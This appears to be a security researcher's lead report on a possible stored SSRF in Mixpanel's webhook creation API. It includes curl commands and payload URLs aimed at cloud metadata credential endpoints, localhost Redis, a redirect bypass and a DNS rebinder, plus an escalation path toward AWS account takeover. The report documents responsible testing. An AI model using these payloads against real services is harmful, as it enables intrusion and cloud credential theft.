# LEAD: Webhook CREATE accepts unfiltered URLs that /test rejects (validation inconsistency)

**Endpoint**: `POST https://mixpanel.com/api/app/projects/{project_id}/webhooks`
**Severity hint**: Medium-High (SSRF stored if trigger path exists). Currently a LEAD pending trigger-mechanism discovery.
**Confidence**: 0.55 — proven validation gap, missing trigger PoC.

## Summary
The webhook configuration API has two URL-validation behaviors:
- `POST /webhooks/test` (validate-then-fire) — **rejects** any URL that resolves to RFC1918, link-local (169.254.169.254), localhost, or invalid scheme with 400 "Failed to send test webhook request".
- `POST /webhooks` (create) — **accepts and persists** the same URLs unfiltered. The webhook record is stored verbatim with `is_enabled: true`.

Created and verified the following webhook records persist with internal-only URLs:

| Name | Stored URL | Result |
|---|---|---|
| create-imds-1 | `http://169.254.169.254/latest/meta-data/iam/security-credentials/` | 200 stored, returned in GET list |
| create-meta-2 | `http://metadata.google.internal/computeMetadata/v1/instance/` | 200 stored |
| create-localhost | `http://127.0.0.1:6379/` | 200 stored |
| create-redir | `https://httpbin.org/redirect-to?url=http://169.254.169.254/...` | 200 stored |
| create-rbndr | `http://7f000001.a9fea9fe.rbndr.us/latest/meta-data/` (DNS rebinder) | 200 stored |

All five were deleted post-test for hygiene.

## Why it is a lead (not yet a finding)
The webhook delivery is triggered by **cohort sync** events (per docs), not by a directly callable API endpoint we discovered in this engagement window. Without finding the trigger that fires the saved webhook, we cannot prove that the server-side fetcher re-validates the URL at fire-time. If it does NOT re-validate (TOCTOU), this becomes a critical SSRF stored as a normal Mixpanel webhook configuration.

## Reproduction
```bash
JWT_COOKIE="csrftoken=...; sessionid=..."
CSRF="..."
curl -s -X POST https://mixpanel.com/api/app/projects/4025923/webhooks \
  -H "Cookie: $JWT_COOKIE" -H "X-CSRFToken: $CSRF" \
  -H "Authorization: Session" -H "Content-Type: application/json" \
  -d '{"name":"imds-store","url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'
# Returns 200 {"status":"ok","results":{"id":"<uuid>","name":"imds-store"}}

curl -s https://mixpanel.com/api/app/projects/4025923/webhooks \
  -H "Cookie: $JWT_COOKIE" -H "X-CSRFToken: $CSRF" -H "Authorization: Session"
# URL is stored verbatim with is_enabled: true
```

Compare with /test:
```bash
curl -s -X POST https://mixpanel.com/api/app/projects/4025923/webhooks/test \
  -H "Cookie: $JWT_COOKIE" -H "X-CSRFToken: $CSRF" \
  -H "Authorization: Session" -H "Content-Type: application/json" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'
# Returns 400 {"status":"error","error":"Failed to send test webhook request"}
```

## Next steps to upgrade lead → finding
1. Discover the cohort-sync trigger that fires the saved webhook (likely `POST /api/2.0/cohorts` w/ sync action, or scheduled background job).
2. If fire-time re-validation is absent → STORED SSRF → IMDS credential theft → AWS account takeover.
3. If fire-time re-validation matches /test (same blocklist), the gap is informational only (validation inconsistency).

## Out-of-band attempts that confirmed normal fetcher behavior
- Fetcher = `python-requests/2.32.2` (User-Agent captured at webhook.site).
- Fetcher FOLLOWS HTTP 302 redirects across hops (verified webhook.site logs received GET hits from httpbin → webhook.site chains).
- Fetcher RE-VALIDATES each hop's URL — confirmed by httpbin.org/redirect-to?url=IMDS returning 400 to caller while public-only redirect chains succeeded.
- DNS rebinding via rbndr.us/1u.ms — fetcher resolves once and validates; no callback received during 60-second observation window.
